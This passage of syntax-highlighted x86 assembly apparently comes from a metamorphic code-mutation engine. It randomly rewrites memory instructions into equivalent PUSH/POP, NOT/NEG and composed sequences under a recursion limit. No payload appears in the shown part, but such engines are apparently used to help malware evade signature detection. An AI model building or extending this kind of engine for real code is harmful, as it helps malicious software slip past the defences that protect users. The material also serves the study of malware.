                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Multiple_OP_CMPTEST_Common</span><span class="sc0">
   </span><span class="sc5">@@Multiple_OP_TEST</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">23h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Bh</span><span class="sc0">
   </span><span class="sc5">@@Multiple_OP_CMPTEST_Common</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Multiple_OP_CMPTEST_Next</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc5">@@Multiple_OP_CMPTEST_Next</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_8Bits</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_CopyMemoryReference</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_RestoreOpAndDecreaseRecurseLevel</span><span class="sc0">
   </span><span class="sc5">@@Multiple_MOV</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc5">@@Multiple_MOV_Other</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">         </span><span class="sc1">; Should we make this specific-for-MOV</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">         </span><span class="sc1">; operation or do we make the normal</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">; one?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Multiple_OP</span><span class="sc0">    </span><span class="sc1">; Make the normal, then</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Multiple_MOV_1</span><span class="sc0">  </span><span class="sc1">; Select one of the two possibilities</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Multiple_MOV_Other</span><span class="sc0">
   </span><span class="sc5">@@Multiple_MOV_2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenPUSHReg</span><span class="sc0">    </span><span class="sc1">; Make PUSH Reg / POP [Mem]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenPOPMem</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_DecreaseRecurseLevel</span><span class="sc0">
   </span><span class="sc5">@@Multiple_MOV_1</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_SaveOperation</span><span class="sc0">       </span><span class="sc1">; Make MOV [TempVar],Reg /</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GetTempVar</span><span class="sc0">          </span><span class="sc1">; / PUSH [TempVar] / POP [Mem]</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Multiple_OP_Common</span><span class="sc0">

   </span><span class="sc5">@@Single</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_8Bits</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Make the pseudoopcode:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                  </span><span class="sc1">; OP + 3 = OP Mem,Reg</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_CopyMemoryReference</span><span class="sc0">  </span><span class="sc1">; Copy the operands</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_DecreaseRecurseLevel</span><span class="sc0">
</span><span class="sc5">Xp_GenOPMemReg</span><span class="sc0">  </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc1">;; Generate an OP [Mem],Imm. Also check special cases.</span><span class="sc0">
</span><span class="sc1">;; When we work with a direct value (Imm), we have lots of new possiblities,</span><span class="sc0">
</span><span class="sc1">;; like the composed operations (ADD + SUB, MOV + OP, etc.).</span><span class="sc0">
</span><span class="sc5">Xp_GenOPMemImm</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">
   </span><span class="sc5">@@Start</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_IncreaseRecurseLevel</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@Single</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">; Single or multiple?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Single</span><span class="sc0">             </span><span class="sc1">; Decide it randomly</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">; Probability of 1/8 of making a triplet</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double</span><span class="sc0">
   </span><span class="sc5">@@Triple</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_8Bits</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; Is size of operands 8 bits?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double</span><span class="sc0">          </span><span class="sc1">; Then, make a pair rather than this</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenPUSHMem</span><span class="sc0">    </span><span class="sc1">; Make PUSH [Mem]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_SaveOperation</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GetTempVar</span><span class="sc0">    </span><span class="sc1">; Make POP [TempVar]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenPOPMem</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">                </span><span class="sc1">; CMP?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Triple_CMP</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">48h</span><span class="sc0">                </span><span class="sc1">; TEST?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Triple_TEST</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenOPMemImm</span><span class="sc0">       </span><span class="sc1">; Generate OP [TempVar],Imm</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenPUSHMem</span><span class="sc0">        </span><span class="sc1">; Generate PUSH [TempVar]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_RestoreOperation</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenPOPMem</span><span class="sc0">         </span><span class="sc1">; Generate POP [Mem]</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_DecreaseRecurseLevel</span><span class="sc0">
   </span><span class="sc5">@@Triple_CMP</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Ch</span><span class="sc0">             </span><span class="sc1">; ECX = SUB Mem,Imm</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Ch</span><span class="sc0">             </span><span class="sc1">; EDX = CMP Mem,Imm</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Triple_CMPTEST_Common</span><span class="sc0">
   </span><span class="sc5">@@Triple_TEST</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">24h</span><span class="sc0">             </span><span class="sc1">; ECX = AND Mem,Imm</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Ch</span><span class="sc0">             </span><span class="sc1">; EDX = TEST Mem,Imm</span><span class="sc0">
   </span><span class="sc5">@@Triple_CMPTEST_Common</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; Select randomly ECX or EDX</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Triple_CMPTEST_Next</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc5">@@Triple_CMPTEST_Next</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_8Bits</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Set the size of the operands</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_CopyMemoryReference</span><span class="sc0">  </span><span class="sc1">; Make the instruction</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Immediate</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_RestoreOpAndDecreaseRecurseLevel</span><span class="sc0">

   </span><span class="sc5">@@Double</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">                 </span><span class="sc1">; MOV?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_MOV</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">; ADD?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_ADD</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">                 </span><span class="sc1">; CMP?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Single</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">48h</span><span class="sc0">                 </span><span class="sc1">; TEST?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Single</span><span class="sc0">
   </span><span class="sc5">@@Double_OP</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_FlagRegOrMem</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                     </span><span class="sc1">; Mark that we are making</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_FlagRegOrMem</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; a memory operation</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_MakeComposedOPImm</span><span class="sc0">       </span><span class="sc1">; Generate a composed op.</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_FlagRegOrMem</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc1">; Restore the flag</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                   </span><span class="sc1">; If we couldn't make it,</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Single</span><span class="sc0">                     </span><span class="sc1">; jump and make a single.</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_DecreaseRecurseLevel</span><span class="sc0">
   </span><span class="sc5">@@Double_MOV</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean</span><span class="sc0">           </span><span class="sc1">; Decide randomly if we do</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; this or a generic operation</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_OP</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_8Bits</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; If size is 8 bits, we can't</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; make this option</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_OP</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenPUSHImm</span><span class="sc0">           </span><span class="sc1">; Generate a PUSH Imm</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenPOPMem</span><span class="sc0">            </span><span class="sc1">; Generate a POP [Mem]</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_DecreaseRecurseLevel</span><span class="sc0">
   </span><span class="sc5">@@Double_ADD</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_OP</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Immediate</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                  </span><span class="sc1">; ADD Mem,1?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_ADD_NOTNEG</span><span class="sc0">       </span><span class="sc1">; Then try NOT+NEG</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">                 </span><span class="sc1">; ADD Mem,-1?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_OP</span><span class="sc0">               </span><span class="sc1">; Then try NEG+NOT</span><span class="sc0">
   </span><span class="sc5">@@Double_ADD_NEGNOT</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenNEGMem</span><span class="sc0">            </span><span class="sc1">; Generate NEG Mem</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenNOTMem</span><span class="sc0">            </span><span class="sc1">; Generate NOT Mem</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_DecreaseRecurseLevel</span><span class="sc0"> </span><span class="sc1">; Effectively decreases Mem</span><span class="sc0">
   </span><span class="sc5">@@Double_ADD_NOTNEG</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenNOTMem</span><span class="sc0">            </span><span class="sc1">; Generate NOT Mem</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenNEGMem</span><span class="sc0">            </span><span class="sc1">; Generate NEG Mem</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_DecreaseRecurseLevel</span><span class="sc0"> </span><span class="sc1">; Effectively increases Mem</span><span class="sc0">


   </span><span class="sc5">@@Single</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get the operation</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">30h</span><span class="sc0">                </span><span class="sc1">; XOR?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Single_XOR</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; ADD?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Single_ADD</span><span class="sc0">
   </span><span class="sc5">@@Single_OP</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Set OP Mem,Imm</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_8Bits</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_CopyMemoryReference</span><span class="sc0">  </span><span class="sc1">; Copy the operands</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Immediate</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_DecreaseRecurseLevel</span><span class="sc0">
   </span><span class="sc5">@@Single_XOR</span><span class="sc4">:</span><span class="sc0">                                </span><span class="sc1">; Check if we are making</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Immediate</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; XOR Mem,-1</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Single_OP</span><span class="sc0">               </span><span class="sc1">; If we are, we can code it</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean</span><span class="sc0">           </span><span class="sc1">; also as NOT Mem</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Single_OP</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenNOTMem</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_DecreaseRecurseLevel</span><span class="sc0">
   </span><span class="sc5">@@Single_ADD</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean</span><span class="sc0">           </span><span class="sc1">; If we do ADD Mem,1/-1, we</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; can use INC Mem or DEC Mem</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Single_OP</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Immediate</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Single_INC</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Single_OP</span><span class="sc0">
